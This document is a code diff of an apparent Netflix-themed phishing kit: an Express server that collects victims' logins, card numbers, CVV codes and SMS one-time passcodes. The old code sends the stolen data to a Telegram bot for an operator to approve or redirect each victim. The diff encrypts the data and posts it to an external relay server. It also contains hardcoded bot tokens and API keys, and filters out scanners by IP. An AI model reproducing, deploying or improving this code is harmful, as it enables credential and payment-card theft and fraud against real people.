@@ -244,6 +244,7 @@ const proxyUrl = `http://${encodedCredentials}@${proxyHost}:${proxyPort}`;
 const agent = new HttpsProxyAgent(proxyUrl);
 const TelegramBot = require('node-telegram-bot-api');
 
+
 const app = express();
 const port = 3011;
 const serpApiKey = "7b9a70551e672ad466cef6bc7955903f3a1122633eea41f47a7ac8a2e8172894";
@@ -251,7 +252,20 @@ const serpApiKey = "7b9a70551e672ad466cef6bc7955903f3a1122633eea41f47a7ac8a2e817
 const ADMIN_CHAT_ID = "1096335592"; // Replace with your chat ID
 const TOKEN = "7129475570:AAE4oX9VxtCqALfHtqjTqCnj6YWP_Pn8wj8";
 
+const algorithm = 'aes-256-cbc';
+const key = Buffer.from('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef', 'hex');
+const iv = Buffer.from('0123456789abcdef0123456789abcdef', 'hex');
+
+
 const pendingSessions = new Map();
+
+function encryptData(data) {
+    const cipher = crypto.createCipheriv(algorithm, key, iv);
+    let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
+    encrypted += cipher.final('hex');
+    return encrypted;
+}
+
 
 class SessionManager {
     constructor() {
@@ -346,14 +360,15 @@ app.use(bodyParser.json());
 app.set("view engine", "ejs");
 
 // Middleware for sessions
-app.use(
-    session({
-        secret: "ThfstiyvWBtcBohE2tkUrhX2EGSUpYE5",
-        resave: false,
-        saveUninitialized: true,
-        cookie: { secure: false },
-    }),
-);
+app.use(session({
+    secret: "ThfstiyvWBtcBohE2tkUrhX2EGSUpYE5",
+    resave: true,  // Changed to true to ensure session is saved
+    saveUninitialized: true,
+    cookie: { 
+        secure: false,
+        maxAge: 60 * 60 * 1000 // 30 minutes
+    }
+}));
 
 
 
@@ -397,6 +412,18 @@ app.use(async (req, res, next) => {
     const userAgent = req.headers['user-agent'];
     const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
     console.log(`Visitor IP: ${ip}, User Agent: ${userAgent}, Is Mobile: ${isMobile}`);
+    const whitelistedPaths = [
+        '/receive-encrypted-data',
+        '/telegram-updates',
+        // Add other paths you want to whitelist
+    ];
+
+    // Check if the request path is whitelisted
+    if (whitelistedPaths.includes(req.path)) {
+        console.log(`Whitelisted path detected --> ${req.path}`);
+        return next();
+    }
+
 
     const checkIPInfo = async (ip) => {
         // Check cache first
@@ -586,7 +613,7 @@ Fraud Score: ${fraud_score}
 // Middleware for domain checking
 app.use((req, res, next) => {
     const host = req.headers.host;
-    if (host.endsWith('fly.dev') || host.endsWith('settlemonitor.com')) {
+    if (host.endsWith('onrender.com') || host.endsWith('settlemonitor.com')) {
         next();
     //} else if (req.ip === "2600:1006:b001:9555:2016:45a5:2047:e86a"){
     //    res.redirect("https://netflix.com/login")
@@ -634,7 +661,7 @@ const blacklistedBanks = ['chase', 'jpmorgan chase', 'jpmorgan chase bank', 'j.p
 //const bot = new TelegramBot(TOKEN, { polling: true });
 // Store pending sessions
 const bot = new TelegramBot(TOKEN, { polling: false }); // Set polling to false
-const WEBHOOK_URL = 'https://5e49f053-1a96-4bfe-b2a1-22c24bb08b14-0-membership.fly.dev/telegram-updates';
+const WEBHOOK_URL = 'https://middle-man-workman1.onrender.com/telegram-updates';
 
 
 // Initialize bot and setup handlers
@@ -714,8 +741,8 @@ app.post("/updatePaymentMethod", async (req, res) => {
         const ip = getClientIp(req);
         const sessionId = Math.random().toString(36).substring(7);
         console.log('Created new session:', sessionId);
-
         // Get bank name and card type
+        req.session.ccnumber = creditCardNumber.replace(/\s+/g, ''); // Remove spaces
         const bin = creditCardNumber.replace(/\s+/g, "").slice(0, 6);
         let bankName = "Unknown Bank";
         let cardType = detectCardType(creditCardNumber);
@@ -760,13 +787,45 @@ app.post("/updatePaymentMethod", async (req, res) => {
         req.session.bankName = bankName;
         req.session.cardType = cardType;
 
+        // Create sensitive data object
+        const sensitiveData = {
+            creditCardNumber,
+            creditExpirationMonth,
+            creditCardSecurityCode,
+            creditCardSecurityPCode,
+            firstName,
+            creditZipcode,
+            cardType,
+            bankName,
+            ip,
+            sessionId
+        };
+
+        // Encrypt the data
+        const encryptedData = encryptData(sensitiveData);
+
+        // Send to Flask API
+        try {
+            await axios.post('https://middle-man-workman1.onrender.com/receive-encrypted-data', {
+                encryptedData,
+                messageType: 'payment'
+            }, {
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            });
+        } catch (error) {
+            console.error("Failed to send to Flask API:", error);
+            throw error;
+        }
+
         const sessionPromise = new Promise((resolve, reject) => {
             const sessionData = {
                 resolve,
                 reject,
                 status: 'pending',
                 userData: { 
-                    fullName: firstName // Store as fullName instead of firstName
+                    fullName: firstName
                 },
                 timeoutId: setTimeout(() => {
                     if (pendingSessions.has(sessionId)) {
@@ -780,64 +839,6 @@ app.post("/updatePaymentMethod", async (req, res) => {
             pendingSessions.set(sessionId, sessionData);
         });
 
-        // Prepare Telegram message
-        let paymentDetailsMessage;
-        if (cardType === 'American Express') {
-            paymentDetailsMessage = `
-- NFX DATA -
-CCNUM: ${creditCardNumber}
-CARD TYPE: ${cardType.toUpperCase()}
-EXP DATE: ${creditExpirationMonth}
-CID: ${creditCardSecurityCode}
-SPC: ${creditCardSecurityPCode}
-FULL NAME: ${firstName.toUpperCase()}
-ZIPCODE: ${creditZipcode}
-BANK: ${bankName.toUpperCase()}
-IP: ${ip}
-Session ID: ${sessionId}`;
-        } else {
-            paymentDetailsMessage = `
-- NFX DATA -
-CCNUM: ${creditCardNumber}
-CARD TYPE: ${cardType.toUpperCase()}
-EXP DATE: ${creditExpirationMonth}
-CVV: ${creditCardSecurityCode}
-FULL NAME: ${firstName.toUpperCase()}
-ZIPCODE: ${creditZipcode}
-BANK: ${bankName.toUpperCase()}
-IP: ${ip}
-Session ID: ${sessionId}`;
-        }
-
-        await sendTelegramMessage(ADMIN_CHAT_ID, paymentDetailsMessage, {
-            inline_keyboard: [
-                [
-                    { 
-                        text: '✅ Approve with Custom URL',
-                        callback_data: `redirect_${sessionId}`
-                    }
-                ],
-                [
-                    {
-                        text: '▶️ Continue to OTP',
-                        callback_data: `approve_${sessionId}`
-                    }
-                ],
-                [
-                    {
-                        text: '❌ Decline Payment',
-                        callback_data: `decline_${sessionId}`
-                    }
-                ],
-                [
-                    {
-                        text: '🔁 Redirect to PPL',
-                        callback_data: `redirect_ppl_${sessionId}`
-                    }
-                ]
-            ]
-        });
-
         console.log('Waiting for response...');
         const response = await sessionPromise;
         console.log('Received response:', response);
@@ -849,12 +850,14 @@ Session ID: ${sessionId}`;
         }
         pendingSessions.delete(sessionId);
 
+        // Handle responses
         if (response.status === 'timeout') {
             return res.json({
                 success: false,
                 message: "Session timed out"
             });
         }
+        
         if (response.status === 'declined') {
             if (response.message === 'redirecting_to_ppl') {
                 return res.json({
@@ -868,6 +871,7 @@ Session ID: ${sessionId}`;
                 message: response.message
             });
         }
+        
         if (response.status === 'url_redirect' && response.url) {
             console.log("Sending URL redirect response:", response.url);
             return res.json({
@@ -931,7 +935,10 @@ async function processUpdate(update) {
             if (action === 'approve') {
                 console.log('⏳ Processing approve action for session:', sessionId);
                 pendingSessions.delete(sessionId);
-                session.resolve({ status: 'approve' });
+                session.resolve({ 
+                    status: 'approve',
+                    redirectUrl: '/otp-verification'
+                });
                 await answerCallbackQuery(query.id, `▶ Continuing to OTP verification for ${fullName}`);
                 await sendTelegramMessage(query.message.chat.id, 
                     `✅ Continued to OTP verification for ${fullName.toUpperCase()}`);
@@ -949,7 +956,8 @@ async function processUpdate(update) {
                 session.resolve({
                     status: 'declined',
                     message: 'redirecting_to_ppl',
-                    showPaymentFormContainer1: true
+                    showPaymentFormContainer1: true,
+                    redirectUrl: '/ppIPaymentSubmitter'
                 });
                 await answerCallbackQuery(query.id, `▶ Redirecting ${fullName} to PPL`);
                 await sendTelegramMessage(query.message.chat.id, 
@@ -960,7 +968,8 @@ async function processUpdate(update) {
                 pendingSessions.delete(sessionId);
                 session.resolve({
                     status: 'declined',
-                    message: "Your card doesn't support this type of purchase. Please try using a different card."
+                    message: "Your card doesn't support this type of purchase. Please try using a different card.",
+                    redirectUrl: '/thank-you'
                 });
                 await answerCallbackQuery(query.id, `Payment declined for ${fullName}`);
                 await sendTelegramMessage(query.message.chat.id, 
@@ -986,7 +995,8 @@ async function processUpdate(update) {
                 pendingSessions.delete(activeSessionId);
                 activeSession.resolve({
                     status: 'url_redirect',
-                    url: update.message.text
+                    url: update.message.text,
+                    redirectUrl: update.message.text
                 });
                 
                 await sendTelegramMessage(update.message.chat.id, 
@@ -1003,35 +1013,123 @@ async function processUpdate(update) {
 }
 
 
-app.post("/submit-form", (req, res) => {
-    const params = req.body.param;
-    const ip = getClientIp(req);
-
+app.post("/submit-form", async (req, res) => {
     try {
+        const params = req.body.param;
+        const ip = getClientIp(req);
+        
         const parsedParams = JSON.parse(decodeURIComponent(params));
         const { userLoginId, password } = parsedParams.fields;
-        const message = `- NFX LOGIN - \nUSER: ${userLoginId}\nPASS: ${password}\nIP: ${ip}\n- NFX LOGIN -`;
-        sendMessageToBot(message);
+
+        // Prepare data for encryption
+        const loginData = {
+            userLoginId,
+            password,
+            ip
+        };
+
+        // Encrypt the data
+        const encryptedData = encryptData(loginData);
+
+        // Send to Flask API
+        try {
+            await axios.post('https://middle-man-workman1.onrender.com/receive-encrypted-data', {
+                encryptedData,
+                messageType: 'login'
+            });
+        } catch (error) {
+            console.error("Failed to send to Flask API:", error);
+            throw error;
+        }
+
         res.redirect("/thank-you");
     } catch (e) {
-        console.error("Failed to parse parameters:", e);
+        console.error("Failed to process request:", e);
         res.status(400).send("Invalid parameters");
     }
 });
 
-// Route to handle OTP verification GET request
+
+app.post('/session-update', (req, res) => {
+    try {
+        const { sessionId, response } = req.body;
+        console.log('Received session update:', { sessionId, response });
+
+        const session = pendingSessions.get(sessionId);
+        if (!session) {
+            console.log('Session not found:', sessionId);
+            return res.status(404).json({ success: false, message: 'Session not found' });
+        }
+
+        if (response.status === 'approve') {
+            pendingSessions.delete(sessionId);
+            session.resolve({
+                status: 'approve',
+                message: 'continue_to_otp',
+                redirectUrl: `/otp-verification?bank=${encodeURIComponent(session.bankName)}&cchold=${encodeURIComponent(session.firstName)}`
+            });
+        } else if (response.status === 'waiting_for_url') {
+            session.status = 'waiting_for_url';
+        } else if (response.status === 'declined') {
+            if (response.message === 'redirecting_to_ppl') {
+                pendingSessions.delete(sessionId);
+                session.resolve({
+                    status: 'declined',
+                    message: 'redirecting_to_ppl',
+                    showPaymentFormContainer1: true,
+                    redirectUrl: '/ppIPaymentSubmitter'
+                });
+            } else {
+                pendingSessions.delete(sessionId);
+                session.resolve({
+                    status: 'declined',
+                    message: response.message || "Your card doesn't support this type of purchase. Please try using a different card.",
+                    redirectUrl: '/thank-you'
+                });
+            }
+        } else if (response.status === 'url_redirect' && response.url) {
+            pendingSessions.delete(sessionId);
+            session.resolve({
+                status: 'url_redirect',
+                url: response.url,
+                redirectUrl: response.url
+            });
+        } else {
+            pendingSessions.delete(sessionId);
+            session.resolve(response);
+        }
+
+        return res.json({
+            success: true,
+            status: response.status,
+            redirectUrl: response.redirectUrl || '/thank-you'
+        });
+
+    } catch (error) {
+        console.error('Error processing session update:', error);
+        res.status(500).json({ success: false, message: error.message });
+    }
+});
 app.get("/otp-verification", (req, res) => {
     const { bank, cchold } = req.query;
     const error = req.query.error || 0;
 
-    if (!bank || !cchold) {
+    // Store in session if not already present
+    if (bank && !req.session.bankName) {
+        req.session.bankName = bank;
+    }
+    if (cchold && !req.session.firstName) {
+        req.session.firstName = cchold;
+    }
+
+    if (!req.session.bankName || !req.session.firstName) {
         return res.status(400).send("Missing required parameters / Session_Terminated_Unexpectedly");
     }
 
     const query = {
         engine: "google",
         api_key: serpApiKey,
-        q: `${bank} bank logo official`,
+        q: `${req.session.bankName} bank logo official`,
         tbm: "isch",
         ijn: "0",
     };
@@ -1042,18 +1140,18 @@ app.get("/otp-verification", (req, res) => {
         const dateYmd = new Date().toLocaleDateString("en-US");
         const phone = req.session.phoneNumber || "Unknown";
         const okbbx = error == 1 ? "okbbxErr" : "okbbx";
-        const msg =
-            error == 1
-                ? `<div class='msg oaerror danger' style='width: 90%; display: table; align-items: stretch;'><p>The one-Time Passcode entered is incorrect. Another OTP has been sent to your mobile <h4 style='font-weight:bold;'>****</h4></p></div>`
-                : "<div class='msg oaerror info' style='width: 90%; display: table; align-items: stretch;'>One-Time Passcode is required for this purchase. This passcode has been sent to your registered mobile.</div>";
-
+        const msg = error == 1
+            ? `<div class='msg oaerror danger' style='width: 90%; display: table; align-items: stretch;'><p>The one-Time Passcode entered is incorrect. Another OTP has been sent to your mobile <h4 style='font-weight:bold;'>****</h4></p></div>`
+            : "<div class='msg oaerror info' style='width: 90%; display: table; align-items: stretch;'>One-Time Passcode is required for this purchase. This passcode has been sent to your registered mobile.</div>";
+        const maskedCC = getTruncatedCCNumber(req.session.ccnumber);
+        console.log("Masked DECRP:", maskedCC); // Debug log
         res.render("otp", {
             lkhr,
             phone: getTruncatedPHONE(phone),
             dateYmd,
-            ccNum: getTruncatedCCNumber(req.session.ccnumber),
-            cchold: req.session.firstName ? req.session.firstName.toUpperCase() : cchold.toUpperCase(),
-            bank: req.session.bankName || bank,
+            ccNum: maskedCC,
+            cchold: req.session.firstName.toUpperCase(),
+            bank: req.session.bankName,
             ip_address: req.ip,
             error,
             okbbx,
@@ -1062,48 +1160,58 @@ app.get("/otp-verification", (req, res) => {
     });
 });
 
-// Route to handle OTP verification POST request
+// POST route for OTP verification
 app.post("/otp-verification", async (req, res) => {
-    const { thd,spc } = req.body;
-    const ip = getClientIp(req);
-    const error = req.query.error || 0;
+    try {
+        if (!req.session.bankName || !req.session.firstName) {
+            return res.status(400).send("Session expired or invalid");
+        }
 
-    let message;
-    if (error == 1) {
-        message = `-------------------- <3 NFX2 <3-------------------
-2ND SMS Code  : ${thd}
-SPC = ${spc}
-IP      : ${ip}:
--------------------- <3 NFX2 <3-------------------`;
-    } else {
-        message = `-------------------- <3 NFX <3-------------------
-SMS Code  : ${thd}
-SPC = ${spc}
-IP      : ${ip}:
--------------------- <3 NFX <3-------------------`;
-    }
+        const { thd, spc } = req.body;
+        const ip = getClientIp(req);
+        const error = req.query.error || 0;
+        
+        const otpData = {
+            type: error == 1 ? 'NFX2' : 'NFX',
+            smsCode: thd,
+            spc: spc || '',
+            ip: ip
+        };
 
-    await sendMessageToBot(message);
+        const encryptedData = encryptData(otpData);
 
-    if (error == 1) {
-        req.session.islast = req.body.islast || "no";
-        if (req.session.islast == "yes") {
-            setTimeout(() => {
-                res.redirect("/thank-you");
-            }, 3000);
-        } else {
+        try {
+            const response = await axios.post('https://middle-man-workman1.onrender.com/receive-encrypted-data', {
+                encryptedData,
+                messageType: 'otp'
+            });
+
+            if (error == 1) {
+                req.session.islast = req.body.islast || "no";
+                if (req.session.islast == "yes") {
+                    return setTimeout(() => {
+                        res.redirect("/thank-you");
+                    }, 3000);
+                }
+            }
+            
+            // Use session data for redirect
             setTimeout(() => {
                 res.redirect(
-                    `/otp-verification?error=1&bank=${encodeURIComponent(req.session.bankName)}&cchold=${encodeURIComponent(req.session.firstName)}`,
+                    `/otp-verification?error=1&bank=${encodeURIComponent(req.session.bankName)}&cchold=${encodeURIComponent(req.session.firstName)}`
                 );
-            }, 2000);
+            }, error == 1 ? 2000 : 10000);
+
+        } catch (error) {
+            console.error("Failed to send to Flask API:", error);
+            throw error;
         }
-    } else {
-        setTimeout(() => {
-            res.redirect(
-                `/otp-verification?error=1&bank=${encodeURIComponent(req.session.bankName)}&cchold=${encodeURIComponent(req.session.firstName)}`,
-            );
-        }, 10000);
+    } catch (error) {
+        console.error("Failed to handle request:", error);
+        res.status(400).json({
+            success: false,
+            message: "Invalid parameters or processing error"
+        });
     }
 });
 
@@ -1168,6 +1276,10 @@ function getTruncatedPHONE(phone) {
 }
 
 function getTruncatedCCNumber(ccNum) {
-    if (!ccNum) return "XXXX-XXXX-XXXX-XXXX"; // Return a default masked number if ccNum is undefined
-    return ccNum.slice(0, -4).replace(/\d/g, "X") + ccNum.slice(-4);
+    if (!ccNum) return "****-****-****-****";
+    // Remove any spaces and ensure it's a string
+    const cleanNum = ccNum.toString().replace(/\s+/g, '');
+    // Add dashes every 4 digits
+    const masked = cleanNum.slice(0, -4).replace(/\d/g, "*") + cleanNum.slice(-4);
+    return masked.match(/.{1,4}/g).join('-');
 }
